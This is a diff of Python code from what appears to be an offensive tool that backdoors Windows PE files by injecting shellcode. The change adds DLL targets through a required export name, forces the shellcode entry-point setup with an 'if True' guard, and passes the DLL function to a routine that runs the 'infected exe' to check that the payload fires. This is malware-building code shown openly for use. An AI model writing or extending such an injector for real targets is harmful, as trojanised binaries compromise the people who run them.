@@ -44,13 +44,17 @@ def inject_exe(
     superpe = SuperPe(exe_in)
     pe_backdoorer = PeBackdoor(superpe, main_shc, carrier_invoke_style)
 
-    if not pe_backdoorer.injectShellcode():
+    if superpe.is_dll() and settings.dllfunc == "":
+        raise Exception("DLL injection requires a DLL function name")
+
+    if not pe_backdoorer.injectShellcode(dllfunc=settings.dllfunc):
         logger.error('Could not inject shellcode into PE file!')
         return False
 
-    if not pe_backdoorer.setupShellcodeEntryPoint():
-        logger.error('Could not setup shellcode launch within PE file!')
-        return False
+    if True: # not superpe.is_dll():
+        if not pe_backdoorer.setupShellcodeEntryPoint():
+            logger.error('Could not setup shellcode launch within PE file!')
+            return False
     
     logger.info("--[ Rewrite placeholders with their data")
     if source_style == FunctionInvokeStyle.iat_reuse:
@@ -161,12 +165,12 @@ def injected_fix_data(superpe: SuperPe, carrier: Carrier, exe_host: ExeHost):
     superpe.write_code_section_data(code)
 
 
-def verify_injected_exe(exefile: FilePath) -> int:
+def verify_injected_exe(exefile: FilePath, dllfunc="") -> int:
     logger.info("---[ Verify infected exe: {} ".format(exefile))
     # remove indicator file
     pathlib.Path(VerifyFilename).unlink(missing_ok=True)
 
-    run_exe(exefile, check=False)
+    run_exe(exefile, dllfunc=dllfunc, check=False)
     time.sleep(SHC_VERIFY_SLEEP)
     if os.path.isfile(VerifyFilename):
         logger.info("---> Verify OK. Infected exe works (file was created)")
